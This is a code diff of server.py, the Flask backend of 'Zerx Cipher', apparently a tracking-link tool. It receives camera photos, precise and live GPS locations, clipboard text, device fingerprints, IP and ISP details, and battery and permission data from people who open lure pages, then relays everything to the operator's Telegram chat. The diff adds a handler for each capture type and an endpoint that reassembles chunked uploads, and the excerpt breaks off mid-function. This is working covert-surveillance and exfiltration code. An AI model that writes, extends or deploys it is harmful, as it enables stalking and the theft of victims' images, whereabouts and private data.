@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
-# server.py — Flask backend for Zerx Cipher v1.6.1
-# Consolidated tracking — ONE message per capture
+# server.py — Flask backend for Zerx Cipher v1.6
+# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store,
+#            /api/preview-store, /preview/<slug>,
+#            /track, /track-camera, /track-chunk, /health
 
 from flask import Flask, request, jsonify, Response
 import hmac, hashlib, time, sqlite3, os, json, base64
 from datetime import datetime, timezone
 
 app = Flask(__name__)
-app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024
+app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50MB for camera payloads
 
 LINK_SECRET = os.environ.get("LINK_SECRET", "zE4o-jRvHuJiSbw-bg72aeygBJ-In52YqBj_oV-PuYoYlmrIhf_jhjzThgCmShLt")
 BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
@@ -19,6 +21,7 @@ FOOTER      = "⚡ Developed by: @zerxofficial"
 _CLONES = {}
 _PREVIEWS = {}
 _LAST_EVENT = {}
+_CHUNKS = {}
 
 ALLOWED_ORIGINS = {
     "https://best-free-ai-tool.netlify.app",
@@ -75,54 +78,6 @@ def _send_telegram_photo(chat_id, b64_data, caption):
     except Exception as e:
         print(f"telegram photo failed: {e}")
 
-def _reverse_geocode(lat, lon):
-    """Server-side reverse geocoding using Nominatim + BigDataCloud fallback."""
-    import requests as rq
-    # Try Nominatim first
-    try:
-        r = rq.get(
-            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1&zoom=18",
-            headers={"User-Agent": "ZerxCipher/1.0"},
-            timeout=5
-        )
-        if r.status_code == 200:
-            d = r.json()
-            addr = d.get("address", {})
-            return {
-                "display": d.get("display_name", ""),
-                "road": addr.get("road") or addr.get("pedestrian") or "",
-                "house": addr.get("house_number", ""),
-                "suburb": addr.get("suburb") or addr.get("neighbourhood", ""),
-                "city": addr.get("city") or addr.get("town") or addr.get("village", ""),
-                "county": addr.get("county", ""),
-                "state": addr.get("state", ""),
-                "postcode": addr.get("postcode", ""),
-                "country": addr.get("country", ""),
-                "countryCode": addr.get("country_code", "").upper(),
-            }
-    except Exception:
-        pass
-    # Fallback: BigDataCloud
-    try:
-        r = rq.get(
-            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={lat}&longitude={lon}&localityLanguage=en",
-            timeout=5
-        )
-        if r.status_code == 200:
-            d = r.json()
-            return {
-                "display": f"{d.get('city') or d.get('locality', '')}, {d.get('principalSubdivision', '')}, {d.get('countryName', '')}",
-                "road": "",
-                "city": d.get("city") or d.get("locality", ""),
-                "state": d.get("principalSubdivision", ""),
-                "country": d.get("countryName", ""),
-                "countryCode": d.get("countryCode", ""),
-                "postcode": "",
-            }
-    except Exception:
-        pass
-    return None
-
 def _mark(uid, typ):
     _LAST_EVENT.setdefault(uid, {})[typ] = time.time()
 
@@ -131,7 +86,7 @@ def _recent(uid, typ, window=30):
     return last.get(typ) and (time.time() - last[typ]) < window
 
 # ============================================================
-# VERIFY
+# VERIFY (link tokens)
 # ============================================================
 @app.route("/api/verify", methods=["GET", "OPTIONS"])
 def api_verify():
@@ -155,7 +110,7 @@ def api_verify():
     return jsonify({"ok": True, "uid": uid})
 
 # ============================================================
-# CLONE STORE
+# CLONE STORE (device monitor / camera / location pages)
 # ============================================================
 @app.route("/api/clone-store", methods=["POST"])
 def clone_store():
@@ -197,7 +152,7 @@ def api_clone(slug):
     return "Not found", 404
 
 # ============================================================
-# PREVIEW STORE
+# PREVIEW STORE (web scrapper mirror)
 # ============================================================
 @app.route("/api/preview-store", methods=["POST", "OPTIONS"])
 def preview_store():
@@ -247,7 +202,7 @@ def preview_view(slug):
     )
 
 # ============================================================
-# TRACK — Silent for heartbeat/location_update, camera photos
+# TRACK — Main tracking endpoint (enhanced)
 # ============================================================
 @app.route("/track", methods=["POST", "OPTIONS"])
 def track():
@@ -261,60 +216,410 @@ def track():
     uid = str(data.get("uid", "")).strip()
     typ = data.get("type", "unknown")
     payload = data.get("data", {}) or {}
-    silent = data.get("silent", False)
-
     if not uid.isdigit():
         return jsonify({"ok": False}), 400
     if not BOT_TOKEN:
         return jsonify({"ok": True}), 200
 
-    # Silent types — no Telegram message
-    if silent or typ in ("heartbeat", "location_update", "sensor"):
-        return jsonify({"ok": True, "silent": True}), 200
-
     now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
 
-    # Camera photos (individual frames from consolidated script)
+    # ── CAMERA (front/back frames) ──
     if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
-        if _recent(uid, "camera", 5):
+        if _recent(uid, "camera", 8):
             return jsonify({"ok": True, "dup": True}), 200
         cam_label = payload.get("camera", "unknown")
+        frame_idx = payload.get("frame", 0)
+        total_frames = payload.get("total", 1)
         caption = (
-            f"📸 <b>Camera — {cam_label}</b>\n"
+            f"📸 <b>Camera Capture</b>\n"
             f"{DIVIDER}\n"
-            f"📅 {now}\n"
-            f"{DIVIDER}\n{FOOTER}"
+            f"📷 Camera: <b>{cam_label}</b>\n"
+            f"🎞 Frame: {frame_idx + 1}/{total_frames}\n"
+            f"📅 Captured: {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
         )
         _send_telegram_photo(uid, payload["image"], caption)
         _mark(uid, "camera")
         return jsonify({"ok": True}), 200
 
-    # Location (initial GPS from consolidated script — sent as part of consolidated msg)
+    # ── PRECISE LOCATION (with reverse geocoding) ──
+    if typ == "precise_location" and isinstance(payload, dict):
+        if _recent(uid, "precise_location", 15):
+            return jsonify({"ok": True, "dup": True}), 200
+        lat = payload.get("lat")
+        lon = payload.get("lon")
+        acc = payload.get("acc")
+        display = payload.get("display", "")
+        road = payload.get("road", "")
+        city = payload.get("city", "")
+        state = payload.get("state", "")
+        postcode = payload.get("postcode", "")
+        country = payload.get("country", "")
+        maps_url = payload.get("mapsUrl", f"https://maps.google.com/?q={lat},{lon}")
+        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
+        addr_parts = [p for p in [road, city, state, postcode, country] if p]
+        addr_line = ", ".join(addr_parts) if addr_parts else "N/A"
+        text = (
+            f"📍 <b>Precise GPS Location</b>\n"
+            f"{DIVIDER}\n"
+            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
+            f"🏠 Address: {addr_line}\n"
+            f"🗺 Full: {display}\n"
+            f"🔗 Maps: {maps_url}\n"
+            f"📅 Captured: {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "precise_location")
+        return jsonify({"ok": True}), 200
+
+    # ── LIVE LOCATION UPDATE (watchPosition) ──
+    if typ == "location_update" and isinstance(payload, dict):
+        if _recent(uid, "location_update", 45):
+            return jsonify({"ok": True, "dup": True}), 200
+        lat = payload.get("lat")
+        lon = payload.get("lon")
+        acc = payload.get("acc")
+        speed = payload.get("speed", 0)
+        heading = payload.get("heading", 0)
+        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
+        maps = f"https://maps.google.com/?q={lat},{lon}"
+        speed_line = f"\n🏃 Speed: {round(speed, 1)} m/s" if speed else ""
+        text = (
+            f"📡 <b>Live Location Update</b>\n"
+            f"{DIVIDER}\n"
+            f"🎯 <code>{lat}, {lon}</code>{acc_line}\n"
+            f"🔗 {maps}{speed_line}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "location_update")
+        return jsonify({"ok": True}), 200
+
+    # ── INITIAL LOCATION ──
     if typ == "location" and isinstance(payload, dict):
-        # This is now handled by /track-consolidated, so just log it
-        return jsonify({"ok": True, "consolidated": True}), 200
+        if _recent(uid, "location", 30):
+            return jsonify({"ok": True, "dup": True}), 200
+        lat = payload.get("lat")
+        lon = payload.get("lon")
+        acc = payload.get("acc")
+        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
+        maps = f"https://maps.google.com/?q={lat},{lon}"
+        text = (
+            f"📍 <b>Live Location Captured</b>\n"
+            f"{DIVIDER}\n"
+            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
+            f"🗺 Map: {maps}\n"
+            f"📅 Captured: {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "location")
+        return jsonify({"ok": True}), 200
 
-    # Device info — now handled by /track-consolidated
-    if typ == "device_info":
-        return jsonify({"ok": True, "consolidated": True}), 200
+    # ── HEARTBEAT (periodic, 60s) ──
+    if typ == "heartbeat" and isinstance(payload, dict):
+        if _recent(uid, "heartbeat", 50):
+            return jsonify({"ok": True, "dup": True}), 200
+        lat = payload.get("lat")
+        lon = payload.get("lon")
+        acc = payload.get("acc")
+        vis = payload.get("visible", "unknown")
+        url = payload.get("url", "n/a")
+        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
+        maps = f"https://maps.google.com/?q={lat},{lon}"
+        text = (
+            f"💓 <b>Heartbeat</b>\n"
+            f"{DIVIDER}\n"
+            f"📍 <code>{lat}, {lon}</code>{acc_line}\n"
+            f"🔗 {maps}\n"
+            f"👁 Page: {vis}\n"
+            f"📄 {url}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "heartbeat")
+        return jsonify({"ok": True}), 200
 
-    # Other types that should be silent
-    if typ in ("battery", "media_devices", "permissions", "storage", "clipboard", "precise_location"):
-        return jsonify({"ok": True, "consolidated": True}), 200
+    # ── DEVICE INFO (enhanced with fingerprints) ──
+    if typ == "device_info" and isinstance(payload, dict):
+        if _recent(uid, "device_info", 60):
+            return jsonify({"ok": True, "dup": True}), 200
 
-    # Generic fallback
+        ua = payload.get("ua", "n/a")
+        platform = payload.get("platform", "n/a")
+        lang = payload.get("lang", "n/a")
+        langs = payload.get("langs", "n/a")
+        screen_res = payload.get("screen", "n/a")
+        avail = payload.get("avail", "n/a")
+        color_depth = payload.get("colorDepth", "n/a")
+        pixel_ratio = payload.get("pixelRatio", "n/a")
+        tz = payload.get("tz", "n/a")
+        tz_offset = payload.get("tzOffset", "n/a")
+        cores = payload.get("cores", "n/a")
+        mem = payload.get("mem", "n/a")
+        touch = payload.get("touch", "n/a")
+        touch_points = payload.get("touchPoints", "n/a")
+        cookies = payload.get("cookies", "n/a")
+        dnt = payload.get("dnt", "n/a")
+        url = payload.get("url", "n/a")
+        referrer = payload.get("referrer", "none")
+        webdriver = payload.get("webdriver", False)
+        pdf_viewer = payload.get("pdfViewer", False)
+        viewport = payload.get("viewport", "n/a")
+        online = payload.get("online", "n/a")
+        conn_type = payload.get("connectionType", "n/a")
+
+        # Fingerprint data
+        canvas_fp = payload.get("canvasFp", "n/a")
+        webgl_fp = payload.get("webglFp", {})
+        if isinstance(webgl_fp, dict):
+            webgl_vendor = webgl_fp.get("vendor", "n/a")
+            webgl_renderer = webgl_fp.get("renderer", "n/a")
+            webgl_version = webgl_fp.get("version", "n/a")
+        else:
+            webgl_vendor = webgl_renderer = webgl_version = str(webgl_fp)
+        audio_fp = payload.get("audioFp", "n/a")
+        fonts = payload.get("fonts", [])
+        fonts_str = ", ".join(fonts) if fonts else "none"
+
+        # Network info
+        network = payload.get("network") or {}
+        net_type = network.get("effectiveType", "n/a") if isinstance(network, dict) else "n/a"
+        net_downlink = network.get("downlink", "n/a") if isinstance(network, dict) else "n/a"
+        net_rtt = network.get("rtt", "n/a") if isinstance(network, dict) else "n/a"
+        net_save = network.get("saveData", "n/a") if isinstance(network, dict) else "n/a"
+
+        # IP data
+        ip = payload.get("ip", "?")
+        country = payload.get("country", "?")
+        cc = payload.get("countryCode", "")
+        region = payload.get("region", "?")
+        city = payload.get("city", "?")
+        zip_code = payload.get("zip", "n/a")
+        isp = payload.get("isp", "?")
+        org = payload.get("org", "?")
+        asn = payload.get("asn", "?")
+        ip_tz = payload.get("ipTz", "n/a")
+        lat = payload.get("lat", "n/a")
+        lon = payload.get("lon", "n/a")
+        mobile = payload.get("mobile", "n/a")
+        proxy = payload.get("proxy", "n/a")
+        hosting = payload.get("hosting", "n/a")
+        reverse_geo = payload.get("reverseGeo", "")
+        address = payload.get("address", {})
+
+        # Battery
+        bat_level = payload.get("batteryLevel", "n/a")
+        bat_charge = payload.get("batteryCharging", "n/a")
+
+        # Sensors
+        sensors = payload.get("sensors", {})
+        sensors_str = json.dumps(sensors)[:100] if sensors else "none"
+
+        text = (
+            f"📊 <b>Visitor Information Captured</b>\n"
+            f"{DIVIDER}\n\n"
+            f"🖥️ <b>Device &amp; Browser</b>\n"
+            f"   • Platform: {platform}\n"
+            f"   • UA: {ua}\n"
+            f"   • Language: {lang} ({langs})\n"
+            f"   • Viewport: {viewport}\n"
+            f"   • Online: {online}\n"
+            f"   • Webdriver: {webdriver}\n"
+            f"   • PDF Viewer: {pdf_viewer}\n\n"
+            f"🔒 <b>Device Fingerprint</b>\n"
+            f"   • Canvas: <code>{canvas_fp}</code>\n"
+            f"   • WebGL Vendor: {webgl_vendor}\n"
+            f"   • WebGL Renderer: {webgl_renderer}\n"
+            f"   • Audio: <code>{audio_fp}</code>\n"
+            f"   • Fonts: {fonts_str}\n\n"
+            f"🌐 <b>Network Information</b>\n"
+            f"   • IP Address: {ip}\n"
+            f"   • ISP: {isp}\n"
+            f"   • Organization: {org}\n"
+            f"   • ASN: {asn}\n"
+            f"   • Connection: {net_type}\n"
+            f"   • Downlink: {net_downlink}\n"
+            f"   • RTT: {net_rtt}\n"
+            f"   • Save Data: {net_save}\n\n"
+            f"📍 <b>Location Details</b>\n"
+            f"   • Country: {country} {_flag_emoji(cc)}\n"
+            f"   • Region: {region}\n"
+            f"   • City: {city}\n"
+            f"   • Zip: {zip_code}\n"
+            f"   • Timezone: {tz}\n"
+            f"   • IP Timezone: {ip_tz}\n"
+            f"   • Lat/Lon: {lat}, {lon}\n"
+            f"   • Mobile: {mobile}\n"
+            f"   • Proxy: {proxy}\n"
+            f"   • Hosting: {hosting}\n"
+            f"   • Reverse Geo: {reverse_geo[:80] if reverse_geo else 'N/A'}\n\n"
+            f"🖼️ <b>Display Information</b>\n"
+            f"   • Resolution: {screen_res}\n"
+            f"   • Available: {avail}\n"
+            f"   • Color Depth: {color_depth}\n"
+            f"   • Pixel Ratio: {pixel_ratio}\n"
+            f"   • Touch: {touch} ({touch_points} pts)\n\n"
+            f"🔋 <b>Battery Status</b>\n"
+            f"   • Level: {bat_level}\n"
+            f"   • Charging: {bat_charge}\n\n"
+            f"💾 <b>Hardware</b>\n"
+            f"   • CPU Cores: {cores}\n"
+            f"   • RAM: {mem} GB\n"
+            f"   • TZ Offset: {tz_offset}\n\n"
+            f"🧭 <b>Sensors</b>\n"
+            f"   • {sensors_str}\n\n"
+            f"⚙️ <b>Other</b>\n"
+            f"   • Cookies: {cookies}\n"
+            f"   • DNT: {dnt}\n"
+            f"   • Referrer: {referrer}\n"
+            f"   • Page URL: {url}\n\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "device_info")
+        return jsonify({"ok": True}), 200
+
+    # ── BATTERY ──
+    if typ == "battery" and isinstance(payload, dict):
+        if _recent(uid, "battery", 120):
+            return jsonify({"ok": True, "dup": True}), 200
+        level = payload.get("level", "n/a")
+        charging = payload.get("charging", "n/a")
+        charge_time = payload.get("chargingTime", "n/a")
+        discharge_time = payload.get("dischargingTime", "n/a")
+        text = (
+            f"🔋 <b>Battery Information</b>\n"
+            f"{DIVIDER}\n"
+            f"   • Level: {level}\n"
+            f"   • Charging: {charging}\n"
+            f"   • Charge Time: {charge_time}\n"
+            f"   • Discharge Time: {discharge_time}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "battery")
+        return jsonify({"ok": True}), 200
+
+    # ── MEDIA DEVICES ──
+    if typ == "media_devices" and isinstance(payload, list):
+        if _recent(uid, "media_devices", 300):
+            return jsonify({"ok": True, "dup": True}), 200
+        lines = []
+        for d in payload:
+            kind = d.get("kind", "?")
+            label = d.get("label", "(unlabeled)")
+            lines.append(f"   • {kind}: {label}")
+        devices_str = "\n".join(lines) if lines else "   • none detected"
+        text = (
+            f"📱 <b>Media Devices</b>\n"
+            f"{DIVIDER}\n"
+            f"{devices_str}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "media_devices")
+        return jsonify({"ok": True}), 200
+
+    # ── PERMISSIONS ──
+    if typ == "permissions" and isinstance(payload, dict):
+        if _recent(uid, "permissions", 300):
+            return jsonify({"ok": True, "dup": True}), 200
+        lines = []
+        for k, v in payload.items():
+            icon = "✅" if v == "granted" else ("❌" if v == "denied" else "⏳")
+            lines.append(f"   • {k}: {icon} {v}")
+        perms_str = "\n".join(lines) if lines else "   • none"
+        text = (
+            f"🔐 <b>Permissions Status</b>\n"
+            f"{DIVIDER}\n"
+            f"{perms_str}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "permissions")
+        return jsonify({"ok": True}), 200
+
+    # ── STORAGE ──
+    if typ == "storage" and isinstance(payload, dict):
+        if _recent(uid, "storage", 300):
+            return jsonify({"ok": True, "dup": True}), 200
+        quota = payload.get("quota", "n/a")
+        usage = payload.get("usage", "n/a")
+        text = (
+            f"💾 <b>Storage Estimate</b>\n"
+            f"{DIVIDER}\n"
+            f"   • Quota: {quota}\n"
+            f"   • Usage: {usage}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "storage")
+        return jsonify({"ok": True}), 200
+
+    # ── CLIPBOARD ──
+    if typ == "clipboard" and isinstance(payload, str):
+        if _recent(uid, "clipboard", 60):
+            return jsonify({"ok": True, "dup": True}), 200
+        clip_text = payload[:500] if payload else "(empty)"
+        text = (
+            f"📋 <b>Clipboard Content</b>\n"
+            f"{DIVIDER}\n"
+            f"<code>{clip_text}</code>\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "clipboard")
+        return jsonify({"ok": True}), 200
+
+    # ── SENSOR (orientation) ──
+    if typ == "sensor" and isinstance(payload, dict):
+        if _recent(uid, "sensor", 30):
+            return jsonify({"ok": True, "dup": True}), 200
+        sensor_type = payload.get("type", "unknown")
+        alpha = payload.get("alpha", "n/a")
+        beta = payload.get("beta", "n/a")
+        gamma = payload.get("gamma", "n/a")
+        text = (
+            f"🧭 <b>Sensor Data — {sensor_type}</b>\n"
+            f"{DIVIDER}\n"
+            f"   • Alpha: {alpha}\n"
+            f"   • Beta: {beta}\n"
+            f"   • Gamma: {gamma}\n"
+            f"📅 {now}\n"
+            f"{DIVIDER}\n{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        _mark(uid, "sensor")
+        return jsonify({"ok": True}), 200
+
+    # ── GENERIC FALLBACK ──
     text = (
         f"📡 <b>{typ}</b>\n"
         f"{DIVIDER}\n"
         f"<code>{json.dumps(payload)[:900]}</code>\n"
         f"📅 {now}\n"
-        f"{DIVIDER}\n{FOOTER}"
+        f"{DIVIDER}\n"
+        f"{FOOTER}"
     )
     _send_telegram_text(uid, text)
     return jsonify({"ok": True}), 200
 
 # ============================================================
-# TRACK-CAMERA — Dedicated for camera photos
+# TRACK-CAMERA — Dedicated endpoint for large camera payloads
 # ============================================================
 @app.route("/track-camera", methods=["POST", "OPTIONS"])
 def track_camera():
@@ -327,31 +632,31 @@ def track_camera():
 
     uid = str(data.get("uid", "")).strip()
     b64_image = data.get("image", "")
-    cam_label = data.get("camera", "unknown")
     if not uid.isdigit() or not b64_image:
         return jsonify({"ok": False}), 400
     if not BOT_TOKEN:
         return jsonify({"ok": True}), 200
 
-    if _recent(uid, f"cam_{cam_label}", 5):
+    if _recent(uid, "track_camera", 5):
         return jsonify({"ok": True, "dup": True}), 200
 
     now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
     caption = (
-        f"📸 <b>Camera Capture — {cam_label}</b>\n"
+        f"📸 <b>Camera Capture (Direct)</b>\n"
         f"{DIVIDER}\n"
-        f"📅 {now}\n"
-        f"{DIVIDER}\n{FOOTER}"
+        f"📅 Captured: {now}\n"
+        f"{DIVIDER}\n"
+        f"{FOOTER}"
     )
     _send_telegram_photo(uid, b64_image, caption)
-    _mark(uid, f"cam_{cam_label}")
+    _mark(uid, "track_camera")
     return jsonify({"ok": True}), 200
 
 # ============================================================
-# TRACK-CONSOLIDATED — ONE message with all data
+# TRACK-CHUNK — Reassemble chunked large payloads
 # ============================================================
-@app.route("/track-consolidated", methods=["POST", "OPTIONS"])
-def track_consolidated():
+@app.route("/track-chunk", methods=["POST", "OPTIONS"])
+def track_chunk():
     if request.method == "OPTIONS":
         return ("", 204)
     try:
@@ -360,252 +665,70 @@ def track_consolidated():
         data = {}
 
     uid = str(data.get("uid", "")).strip()
-    capture_type = data.get("capture_type", "device_monitor")
-    if not uid.isdigit():
+    typ = data.get("type", "unknown")
+    chunk_idx = data.get("chunk", 0)
+    total = data.get("total", 1)
+    chunk_data = data.get("data", "")
+
+    if not uid.isdigit() or not chunk_data:
         return jsonify({"ok": False}), 400
+
+    # Store chunk
+    chunk_key = f"{uid}_{typ}"
+    if chunk_idx == 0:
+        _CHUNKS[chunk_key] = {"total": total, "parts": {}}
+    if chunk_key not in _CHUNKS:
+        _CHUNKS[chunk_key] = {"total": total, "parts": {}}
+    _CHUNKS[chunk_key]["parts"][chunk_idx] = chunk_data
+
+    # Check if all chunks received
+    received = len(_CHUNKS[chunk_key]["parts"])
+    if received < total:
+        return jsonify({"ok": True, "complete": False, "received": received, "total": total}), 200
+
+    # Reassemble
+    full_str = ""
+    for i in range(total):
+        full_str += _CHUNKS[chunk_key]["parts"].get(i, "")
+
+    # Clean up
+    del _CHUNKS[chunk_key]
+
     if not BOT_TOKEN:
         return jsonify({"ok": True}), 200
 
-    if _recent(uid, f"consolidated_{capture_type}", 10):
-        return jsonify({"ok": True, "dup": True}), 200
-
     now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
 
-    device = data.get("device", {}) or {}
-    network = data.get("network", {}) or {}
-    gps = data.get("gps", {}) or {}
-    battery = data.get("battery", {}) or {}
-    fingerprint = data.get("fingerprint", {}) or {}
+    # If it's a camera image, send as photo
+    if typ == "camera":
+        try:
+            payload = json.loads(full_str)
+            if isinstance(payload, dict) and payload.get("image"):
+                cam_label = payload.get("camera", "unknown")
+                caption = (
+                    f"📸 <b>Camera Capture (Chunked)</b>\n"
+                    f"{DIVIDER}\n"
+                    f"📷 Camera: <b>{cam_label}</b>\n"
+                    f"📅 Captured: {now}\n"
+                    f"{DIVIDER}\n"
+                    f"{FOOTER}"
+                )
+                _send_telegram_photo(uid, payload["image"], caption)
+                return jsonify({"ok": True, "complete": True}), 200
+        except Exception:
+            pass
 
-    # ── Reverse geocode GPS coordinates server-side ──
-    geo_info = None
-    if gps and gps.get("lat") and gps.get("lon"):
-        geo_info = _reverse_geocode(gps["lat"], gps["lon"])
-
-    # ── Format based on capture type ──
-    if capture_type == "camera_link":
-        text = _format_camera_link(device, network, now)
-    elif capture_type == "location_link":
-        text = _format_location_link(device, network, gps, geo_info, now)
-    else:  # device_monitor
-        text = _format_device_monitor(device, network, gps, geo_info, battery, fingerprint, now)
-
+    # Otherwise send as text (truncated)
+    text = (
+        f"📦 <b>{typ} (reassembled)</b>\n"
+        f"{DIVIDER}\n"
+        f"<code>{full_str[:3500]}</code>\n"
+        f"📅 {now}\n"
+        f"{DIVIDER}\n"
+        f"{FOOTER}"
+    )
     _send_telegram_text(uid, text)
-    _mark(uid, f"consolidated_{capture_type}")
-    return jsonify({"ok": True}), 200
-
-def _format_camera_link(device, network, now):
-    ip = network.get("ip") or device.get("ip") or "?"
-    country = network.get("country") or device.get("country") or "?"
-    cc = network.get("countryCode") or device.get("countryCode") or ""
-    platform = device.get("platform", "n/a")
-    ua = device.get("ua", "n/a")
-    city = network.get("city") or device.get("city") or "?"
-    isp = network.get("isp") or device.get("isp") or "?"
-
-    return (
-        f"📸 <b>Camera Capture</b>\n"
-        f"{DIVIDER}\n\n"
-        f"🖥️ <b>Device</b>\n"
-        f"   • Platform: {platform}\n"
-        f"   • UA: {ua}\n\n"
-        f"🌐 <b>Network</b>\n"
-        f"   • IP: <code>{ip}</code>\n"
-        f"   • ISP: {isp}\n"
-        f"   • Location: {country} {_flag_emoji(cc)}\n"
-        f"   • City: {city}\n\n"
-        f"📅 {now}\n"
-        f"{DIVIDER}\n{FOOTER}"
-    )
-
-def _format_location_link(device, network, gps, geo_info, now):
-    ip = network.get("ip") or device.get("ip") or "?"
-    platform = device.get("platform", "n/a")
-    ua = device.get("ua", "n/a")
-
-    lat = gps.get("lat") if gps else None
-    lon = gps.get("lon") if gps else None
-    acc = gps.get("acc") if gps else None
-
-    if lat and lon:
-        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
-        maps_url = f"https://maps.google.com/?q={lat},{lon}"
-
-        if geo_info:
-            road = geo_info.get("road", "")
-            city = geo_info.get("city", "")
-            state = geo_info.get("state", "")
-            country = geo_info.get("country", "")
-            postcode = geo_info.get("postcode", "")
-            display = geo_info.get("display", "")
-            addr_parts = [p for p in [road, city, state, postcode] if p]
-            addr_line = ", ".join(addr_parts) if addr_parts else display or "N/A"
-        else:
-            addr_line = "N/A"
-
-        return (
-            f"🌍 <b>Exact Location Captured</b>\n"
-            f"{DIVIDER}\n\n"
-            f"📍 <b>GPS Coordinates</b>\n"
-            f"   • Lat: <code>{lat}</code>\n"
-            f"   • Lon: <code>{lon}</code>\n"
-            f"   • Accuracy: ±{round(acc) if isinstance(acc, (int, float)) else '?'}m\n\n"
-            f"🏠 <b>Address</b>\n"
-            f"   • {addr_line}\n\n"
-            f"🗺 <b>Google Maps</b>\n"
-            f"   • {maps_url}\n\n"
-            f"🖥️ <b>Device</b>\n"
-            f"   • Platform: {platform}\n"
-            f"   • IP: <code>{ip}</code>\n\n"
-            f"📅 {now}\n"
-            f"{DIVIDER}\n{FOOTER}"
-        )
-    else:
-        # GPS not available, show IP-based location
-        country = network.get("country") or device.get("country") or "?"
-        cc = network.get("countryCode") or device.get("countryCode") or ""
-        city = network.get("city") or device.get("city") or "?"
-        isp = network.get("isp") or device.get("isp") or "?"
-        ip_lat = network.get("lat") or device.get("lat")
-        ip_lon = network.get("lon") or device.get("lon")
-
-        maps_url = f"https://maps.google.com/?q={ip_lat},{ip_lon}" if ip_lat and ip_lon else ""
-
-        return (
-            f"🌍 <b>Location Capture</b>\n"
-            f"{DIVIDER}\n\n"
-            f"⚠️ GPS not available — showing IP-based location (approximate)\n\n"
-            f"🌐 <b>Network Location</b>\n"
-            f"   • IP: <code>{ip}</code>\n"
-            f"   • ISP: {isp}\n"
-            f"   • Country: {country} {_flag_emoji(cc)}\n"
-            f"   • City: {city}\n"
-            f"{f'   • Maps: {maps_url}\n' if maps_url else ''}\n"
-            f"🖥️ <b>Device</b>\n"
-            f"   • Platform: {platform}\n\n"
-            f"📅 {now}\n"
-            f"{DIVIDER}\n{FOOTER}"
-        )
-
-def _format_device_monitor(device, network, gps, geo_info, battery, fingerprint, now):
-    ua = device.get("ua", "n/a")
-    platform = device.get("platform", "n/a")
-    lang = device.get("lang", "n/a")
-    screen_res = device.get("screen", "n/a")
-    viewport = device.get("viewport", "n/a")
-    color_depth = device.get("colorDepth", "n/a")
-    tz = device.get("tz", "n/a")
-    cores = device.get("cores", "n/a")
-    mem = device.get("mem", "n/a")
-    touch = device.get("touch", "n/a")
-    touch_points = device.get("touchPoints", "n/a")
-    cookies = device.get("cookies", "n/a")
-    url = device.get("url", "n/a")
-    referrer = device.get("referrer", "none")
-
-    # Fingerprint
-    canvas_fp = device.get("canvasFp", "n/a")
-    webgl_fp = device.get("webglFp", {})
-    if isinstance(webgl_fp, dict):
-        webgl_vendor = webgl_fp.get("vendor", "n/a")
-        webgl_renderer = webgl_fp.get("renderer", "n/a")
-    else:
-        webgl_vendor = webgl_renderer = str(webgl_fp)
-    audio_fp = fingerprint.get("audio", "n/a") if isinstance(fingerprint, dict) else "n/a"
-
-    # Network
-    ip = network.get("ip") or device.get("ip") or "?"
-    country = network.get("country") or device.get("country") or "?"
-    cc = network.get("countryCode") or device.get("countryCode") or ""
-    region = network.get("region") or device.get("region") or "?"
-    city = network.get("city") or device.get("city") or "?"
-    isp = network.get("isp") or device.get("isp") or "?"
-    asn = network.get("asn") or device.get("asn") or "?"
-    ip_lat = network.get("lat") or device.get("lat")
-    ip_lon = network.get("lon") or device.get("lon")
-
-    # GPS
-    gps_lat = gps.get("lat") if gps else None
-    gps_lon = gps.get("lon") if gps else None
-    gps_acc = gps.get("acc") if gps else None
-
-    # Battery
-    bat_level = battery.get("level", "n/a") if battery else "n/a"
-    bat_charge = battery.get("charging", "n/a") if battery else "n/a"
-
-    # Build location section
-    if gps_lat and gps_lon:
-        acc_line = f" (±{round(gps_acc)}m)" if isinstance(gps_acc, (int, float)) else ""
-        maps_url = f"https://maps.google.com/?q={gps_lat},{gps_lon}"
-        if geo_info:
-            road = geo_info.get("road", "")
-            geo_city = geo_info.get("city", "")
-            state = geo_info.get("state", "")
-            geo_country = geo_info.get("country", "")
-            postcode = geo_info.get("postcode", "")
